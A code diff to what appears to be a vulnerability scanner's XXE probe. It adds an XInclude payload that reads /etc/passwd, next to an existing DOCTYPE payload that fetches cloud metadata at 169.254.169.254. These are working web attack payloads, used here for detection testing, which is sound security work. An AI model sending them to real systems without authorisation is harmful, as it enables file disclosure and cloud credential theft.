@@ -511,7 +511,8 @@ def probe_ssrf(ctx: Context, url: str, param: str,
 
 def probe_xxe(ctx: Context, url: str) -> dict:
     """XXE matched-pair: baseline is a plain XML POST, then doctype
-    payloads declaring external entities (local file, cloud metadata).
+    payloads declaring external entities (local file, cloud metadata),
+    plus an XInclude variant for parsers where DOCTYPE is filtered.
     File/metadata bytes in the echoed body are the signal."""
     hdr = {"Content-Type": "application/xml"}
     base = ctx.client.send("POST", url, headers=hdr,
@@ -527,6 +528,10 @@ def probe_xxe(ctx: Context, url: str) -> dict:
         ("ssrf-via-xxe",
          '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
          '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>'),
+        ("xinclude-fallback",
+         '<?xml version="1.0"?><r xmlns:xi='
+         '"http://www.w3.org/2001/XInclude">'
+         '<xi:include href="file:///etc/passwd" parse="text"/></r>'),
     ]
     hits = []
     for name, doc in payloads:
